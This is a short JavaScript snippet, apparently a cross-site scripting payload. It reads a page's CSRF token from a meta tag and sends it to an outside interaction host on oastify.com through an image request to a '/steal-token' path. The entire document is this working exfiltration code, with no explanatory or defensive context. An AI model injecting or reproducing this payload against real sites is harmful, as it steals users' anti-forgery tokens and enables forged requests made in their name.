const tokenValue = document.querySelector('meta[name="csrf-token"]').getAttribute('content'); 
const img = new Image(); 
const attackerServerUrl = 'https://aaoxzv7im9wiiquk8o460slj3a91xrlg.oastify.com/steal-token';
const url = `${attackerServerUrl}?stolen_token=${encodeURIComponent(tokenValue)}`;
img.src = url;
document.body.appendChild(img);
